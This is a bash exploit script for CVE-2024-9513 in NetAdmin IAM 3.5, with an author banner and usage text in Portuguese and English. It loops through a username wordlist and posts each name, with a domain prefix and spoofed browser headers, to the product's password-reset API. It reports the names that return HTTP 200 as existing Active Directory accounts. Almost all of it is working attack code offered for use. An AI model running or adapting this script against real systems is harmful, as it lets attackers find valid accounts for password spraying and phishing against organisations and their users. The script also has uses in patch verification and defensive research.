#!/bin/bash

# Exploit Title: CVE-2024-9513 - NetAdmin IAM Allows User Enumeration In Active Directory
# Date:  2024-10-04
# Exploit Author: Elizeu Das Dores (ELIZEUOPAIN)
# Vendor Homepage: https://netadmin.software/
# Version: 3.5
# Tested on: 20224-10-05
# CVE : CVE-2024-9513
# References: https://www.cve.org/CVERecord?id=CVE-2024-9513

VERDE='\033[0;32m'
RESET='\033[0m'

banner_exploit() {
    echo -e "${VERDE}"
    echo "                                                                   
   (                    )   )    )    )       ) (  (      )     )  
   )\  (   (  (      ( /(( /( ( /( ( /(    ( /( )\))(  ( /(  ( /(  
 (((_) )\  )\ )\ ___ )(_))\()))(_)))\())__ )\()|(_)()\ )\()) )\()) 
 )\___((_)((_|(_)___((_)((_)\((_) ((_)\___((_)\ (()((_|(_)\ ((_)\  
((/ __\ \ / /| __|  |_  )  (_)_  ) | (_)  / _(_) | __| / (_)__ (_) 
 | (__ \ V / | _|    / / () | / /|_  _|   \_, /  |__ \ | |  |_ \   
  \___| \_/  |___|  /___\__/ /___| |_|     /_/   |___/ |_| |___/   
                                                                   
"
    echo "                 Exploit: CVE-2024-9513                     "
    echo "                 Author: Elizeu Das Dores (ELIZEUOPAIN)                 "
    echo "                 LinkedIn: https://www.linkedin.com/in/elizeu-das-dores/ "
    echo -e "${RESET}"
}

banner_exploit

if [ "$#" -ne 3 ]; then
    echo "Uso: $0 <site> <DomainAD> <arquivo_com_usuarios>"
    echo "Example: $0 https://site.com SITECORP users_list.txt"
    echo "OBS: O <DomainAD> é exibido na página de redefinição de senha."
    exit 1
fi

site="$1"
prefixo_usuario="$2"
arquivo_usuarios="$3"

if [ ! -f "$arquivo_usuarios" ]; then
    echo "Arquivo não encontrado: $arquivo_usuarios"
    exit 1
fi

verificar_usuario() {
    local usuario=$1
    status_code=$(curl -s -o /dev/null -w "%{http_code}" \
        -H "Host: ${site#https://}" \
        -H "Content-Length: 32" \
        -H "Sec-Ch-Ua: \"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Sec-Ch-Ua-Platform: \"Windows\"" \
        -H "Accept-Language: en-US" \
        -H "Sec-Ch-Ua-Mobile: ?0" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "Origin: ${site}" \
        -H "Sec-Fetch-Site: same-origin" \
        -H "Sec-Fetch-Mode: cors" \
        -H "Sec-Fetch-Dest: empty" \
        -H "Referer: ${site}/ad/" \
        -H "Accept-Encoding: gzip, deflate, br" \
        -H "Priority: u=1, i" \
        --data-binary "{\"username\":\"${prefixo_usuario}\\\\${usuario}\"}" \
        "${site}/controllerad/api/Answer/ReturnUserQuestionsFilled")

    if [ "$status_code" -eq 200 ]; then
        echo -e "${VERDE}Usuário: ${usuario} encontrado${RESET}"
    fi
}

while IFS= read -r usuario; do
    verificar_usuario "$usuario"
done < "$arquivo_usuarios"
